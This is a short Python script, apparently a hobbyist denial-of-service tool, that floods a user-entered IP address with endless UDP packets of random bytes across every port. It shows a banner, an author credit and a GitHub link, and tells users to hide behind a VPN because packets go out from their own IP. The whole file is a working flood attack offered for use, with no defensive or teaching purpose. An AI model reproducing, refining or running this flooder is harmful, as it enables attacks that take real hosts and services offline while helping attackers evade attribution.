import sys
import os
import time
from requests import get
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
banner="""
  ____     ___    ____    _  _                         _                         
 |  _ \   / _ \  / ___|  | || |    _ __ ___     __ _  | |__        _ __    _   _ 
 | | | | | | | | \___ \  | || |_  | '_ ` _ \   / _` | | '_ \      | '_ \  | | | |
 | |_| | | |_| |  ___) | |__   _| | | | | | | | (_| | | | | |  _  | |_) | | |_| |
 |____/   \___/  |____/     |_|   |_| |_| |_|  \__,_| |_| |_| (_) | .__/   \__, |
                                                                  |_|      |___/ 
lütfen vpn ve ve benzeri şeyler kullanın çünkü kendi ipnizden defualt olarak paket yollar
please use vpn and similar stuff because it sends packets from your own ip as defualt"""
def getip():
    IP_API = "https://api.ipify.org/?format=json"
    while True:
        try:
            jsonRes = get(IP_API).json()
            ipTxt = jsonRes["ip"]
        except:
            continue
        break
    return ipTxt
print(banner)
print("\n")
print("Author: Mah6301")
print("Github: https://github.com/C0derByM4H6301\n")
try:
    print("Your ip: "+getip())
    ip=str(input("ip: "))
    port=int(input("port: "))
    print("Target ip: ",ip)
    print("Target port: ",port)
    serdar_sent= 0
    while True:
        sock.sendto(bytes, (ip,port))
        serdar_sent=serdar_sent+1
        port=port+1
        print("Serdar sent {} packet to {} throught port:{}".format(serdar_sent,ip,port))
        if port ==65534:
            port=1
except KeyboardInterrupt:
    print("CTRL+C detected, exiting...")
    exit()